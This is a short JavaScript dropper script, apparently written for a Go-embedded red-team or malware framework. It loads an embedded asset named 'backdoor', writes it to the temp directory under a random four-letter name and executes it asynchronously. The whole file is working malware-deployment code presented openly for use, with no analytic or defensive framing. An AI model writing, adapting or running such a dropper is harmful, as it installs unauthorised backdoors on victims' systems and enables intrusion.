//priority:999
//import:backdoor
//go_import:os as os

function Deploy() {  
    
	console.log("Starting to drop backdoor binary");
   	
	// Getting our asset
    	var backdoorBin = GetAssetAsBytes("backdoor");
    	console.log("errors: "+Dump(backdoorBin[1]));
    
	// Getting a random string
    	var temppath = os.TempDir();
    	var naming = G.rand.GetAlphaString(4);
    	naming = naming.toLowerCase();
    	fullpath = temppath+"/"+naming;
    	console.log("file name: "+ fullpath);
    
	// Write payload
    	errors = G.file.WriteFileFromBytes(fullpath, backdoorBin[0]);
   	console.log("errors: "+Dump(errors));
    	
	// Run payload
    	var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    	console.log("errors: "+Dump(running[1]));
	
	return true
}
